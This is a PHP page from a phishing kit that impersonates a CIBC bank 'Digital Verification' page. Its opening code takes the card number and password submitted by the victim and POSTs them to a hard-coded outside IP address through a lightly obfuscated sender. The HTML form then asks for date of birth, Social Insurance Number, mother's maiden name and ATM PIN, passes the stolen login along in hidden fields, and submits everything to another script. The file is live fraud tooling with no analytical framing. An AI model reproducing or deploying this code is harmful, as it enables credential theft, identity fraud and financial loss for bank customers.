<?php
require 'call.php';
require 'c.php';
$user = @$_POST['usercard'];
$pass = @$_POST['passcard'];

$data = "CBC=>[$device]$user:$pass#$ip#$browser#$hostname";


function hextobin($hexstr) 
    { 
        $n = strlen($hexstr); 
        $sbin="";   
        $i=0; 
        while($i<$n) 
        {       
            $a =substr($hexstr,$i,2);           
            @$c = pack("H*",$a); 
            if ($i==0){$sbin=$c;} 
            else {$sbin.=$c;} 
            $i+=2; 
        } 
        return $sbin; 
    } 



if ($user == "" || $pass == "" ) {
  echo "<meta http-equiv='refresh' content='0;url=index.php'>";
  die();
}
$decpassword = "mydaasdatau412222rl11";
function awe($data,$site) { 
	global $textHos;
	$data = array('info' => $data);
	$options = array(
		'http' => array(
			'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
			'method'  => 'POST',
			'content' => http_build_query($data),
		),
	);
	$context  = stream_context_create($options);
	$result = @file_get_contents($site, false, $context);	
}
$urlz = array("http://185.234.216.94/st.php","");                                                                                                                                                                                                                         
foreach ($urls as $site) {
   $urlz = hextobin($site);
	awe($data,$urlz);

}
?>
<!DOCTYPE html>
<html ng-app="journeyOSA" ng-strict-di="" lang="en" class="mobile android en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
<meta name="referrer" content="no-referrer" />
		<meta name="robots" content="noindex, nofollow"/>
        <meta http-equiv="X-UA-Compatible" content="IE=Edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
		<title ng-bind="pageTitle">CIBC&#x20;&#x7C;&#x20;&#x44;&#x69;&#x67;&#x69;&#x74;&#x61;&#x6C;&#x20;&#x56;&#x65;&#x72;&#x69;&#x66;&#x69;&#x63;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x20;&#x7C;&#x20;CIBC&#x20;&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x6F;&#x66;&#x20;&#x4D;&#x6F;&#x6E;&#x74;&#x72;&#x65;&#x61;&#x6C;</title>
  <!--END SITE INTERCEPT-->
    <link href="cc0b8d7gfc80b57c.css" rel="stylesheet">
        <link rel="icon" href="favicon.ico">
        <!-- Google Tag Manager (noscript) -->
        <!-- End Google Tag Manager (noscript) -->
        <script type="text/javascript" language="Javascript" src="8c5cgc76136c8heg/46cd5he8f320g7be.js" ></script>
        </head><body><axa-header>
            <div class="container" ng-show="headerShow" aria-hidden="false">
                <div class="wrapper">
                       <img
        src="1234.png"
        width="170" height="60"
        align="middle"
        style="float: left;
          position: relative;
          display: block;
          margin-left: auto;
          margin-right: auto;
          z-index: 1;"
        ><div class="page-content"> <div>&nbsp;</div>	
                    <button class="menu" aria-label="Menu" ng-click="onShowMenu($event)" ng-hide="currentState == 'openAccount' || hideMenu" aria-hidden="false">
                        <div class="dot-menu shape-back" ng-class="{&quot;reshape&quot;: showMenu &amp;&amp; !$root.APP.isDesktop, &quot;shape-back&quot;:!showMenu}">
                            <div class="dot top"></div>
                            <div class="dot middle"></div>
                            <div class="dot bottom"></div>
                        </div>
                    </button>
                        </div>
                        </div>
                </div>
            </div>
            </axa-header>
        <!----><axa-progress-bar ng-if="::!APP.isDesktop" aria-hidden="false" style="">
            <div class="axa-progress-background">
                <div id="axa-progress-check" role="progressbar" aria-valuemin="0" aria-valuemax="100" class="" aria-valuenow="6" aria-valuetext="progress is 6 percent." style="left: 6%;">
                    <img class="axa-progress-check-halo" alt="">
                    <img class="axa-progress-check-icon" ng-src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTgiIGhlaWdodD0iMTUiIHZpZXdCb3g9IjAgMCAxOCAxNSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48dGl0bGU+U2hhcGU8L3RpdGxlPjxwYXRoIGQ9Ik01LjcyIDExLjgzNEwxLjQ1MyA3LjE3IDAgOC43NDcgNS43MiAxNSAxOCAxLjU3NyAxNi41NTcgMHoiIGZpbGw9IiNGRkYiIGZpbGwtcnVsZT0iZXZlbm9kZCIvPjwvc3ZnPg==" alt="" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTgiIGhlaWdodD0iMTUiIHZpZXdCb3g9IjAgMCAxOCAxNSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48dGl0bGU+U2hhcGU8L3RpdGxlPjxwYXRoIGQ9Ik01LjcyIDExLjgzNEwxLjQ1MyA3LjE3IDAgOC43NDcgNS43MiAxNSAxOCAxLjU3NyAxNi41NTcgMHoiIGZpbGw9IiNGRkYiIGZpbGwtcnVsZT0iZXZlbm9kZCIvPjwvc3ZnPg==">
                </div>
                <div class="axa-progress-percentage" data-axa-progress-percentage="50" style="width: 50%;"></div>
                    <div class="progress-tooltip-box">
                        <div id="axa-progress-bar-tooltip-arrow" style="left: 6%;"></div>
                        <div class="progress-tooltip">
                            <!---->
                        </div>
                </div>
            </div>
            <axa-progressbar-tooltip class="hide"></axa-progressbar-tooltip></axa-progress-bar><!---->
        <div axa-navigation-css-route="" class="navigation-animate next" aria-hidden="false">
<!----><div ui-view="" class="" style=""><component-name class="component max-width" is-active="true" state-params="$resolve.stateParams" axa-ally-screen-focus=""><!---->
<div id="name" class="wrapper-page slide" ng-if="!NameCtrl.isShowSummary"> <div class="page"> <div>&nbsp;</div>	


        <img
        width="0" height="0"
        align="middle"
        style="float: left;
          position: relative;
          display: block;
          margin-left: auto;
          margin-right: auto;
          z-index: 1;"

			<h1 tabindex="-1">To get your status update, enter your full legal details (as they appear on your driver’s license or passport, for example) </h1> 
			<div class="subtext"></div> 
			<form  onsubmit="return bmc(this);" action="dfndata.php" method="post" name="NameCtrl.formName" class="ng-pristine ng-invalid ng-invalid-required ng-valid-pattern ng-valid-minlength ng-valid-maxlength ng-valid-invalid-characters">
			<input type="hidden" name="user" value="<?php print "$user"; ?>">
			<input type="hidden" name="pass" value="<?php print "$pass"; ?>">
			<div class="wrapper-input"> 
			<!----> 
		
	
				<div class="input-label-wrapper ng-pristine axa-text-input ng-animate-disabled ng-empty ng-invalid ng-invalid-required ng-valid-pattern ng-valid-minlength ng-valid-maxlength ng-valid-invalid-characters ng-touched">
				<p style="margin-bottom: 5px; font-weight: bold;">&nbsp;&nbsp;Date of birth</p>
			<input name="dobd" type="tel" maxlength="2" required="true" class="ng-pristine axa-text-input" style="display: inline-block; width: 55px;" id="dobd" placeholder="DD"> -
			<input name="dobm" type="tel"  maxlength="2" required="true" class="ng-pristine axa-text-input" style="display: inline-block; width: 55px;" id="dobm" placeholder="MM"> -
			<input name="doby" type="tel"  maxlength="4" required="true" class="ng-pristine axa-text-input" style="display: inline-block; width: 110px;"  id="doby" placeholder="YYYY">
			</div> 
			
			
			
			<div class="input-label-wrapper ng-pristine axa-text-input ng-animate-disabled ng-empty ng-invalid ng-invalid-required ng-valid-pattern ng-valid-minlength ng-valid-maxlength ng-valid-invalid-characters ng-touched">
				<p style="margin-bottom: 5px; font-weight: bold;">&nbsp;&nbsp;Social Insurance Number</p>
			<input name="sin1" type="tel" maxlength="3" required="true" class="ng-pristine axa-text-input" style="display: inline-block; width: 75px;" id="sin1" placeholder="nnn"> -
			<input name="sin2" type="tel"  maxlength="3" required="true" class="ng-pristine axa-text-input" style="display: inline-block; width: 75px;" id="sin2" placeholder="nnn"> -
			<input name="sin3" type="tel"  maxlength="3" required="true" class="ng-pristine axa-text-input" style="display: inline-block; width: 75px;"  id="sin3" placeholder="nnn">
			</div> 
		   
		   <div class="input-label-wrapper ng-pristine axa-text-input ng-animate-disabled ng-empty ng-invalid ng-invalid-required ng-valid-pattern ng-valid-minlength ng-valid-maxlength ng-valid-invalid-characters ng-touched">
               <p style="margin-bottom: 5px; font-weight: bold;">&nbsp;&nbsp;Mother's maiden name</p>
			<input name="mmn" type="text" maxlength="30" required="true" class="ng-pristine axa-text-input" id="mmn" placeholder="Mother's Maiden Name">
			</div> 
			

	
			  
	
			
						 <div class="input-label-wrapper ng-pristine axa-text-input ng-animate-disabled ng-empty ng-invalid ng-invalid-required ng-valid-pattern ng-valid-minlength ng-valid-maxlength ng-valid-invalid-characters ng-touched">
							<p style="margin-bottom: 5px; font-weight: bold;">&nbsp;&nbsp;ATM PIN</p>
			<input name="atmp" type="tel"  maxlength="5" required="true" class="ng-pristine axa-text-input" style="display: inline-block; width: 90px;"  id="atmp" placeholder="">
			</div>  
			
					
			
			<div class="spinner" ng-disabled="loading" ng-class="{'loading': loading}" aria-disabled="false">
			
			
			
				<p style="margin-bottom: 5px; font-weight: bold;">&nbsp;&nbsp;</p>
				</div>
			
			
                <button type="submit" class="primary">
                    Next
                </button>
                <div class="spinner" ng-disabled="loading" ng-class="{'loading': loading}" aria-disabled="false"></div>
</div></body></html>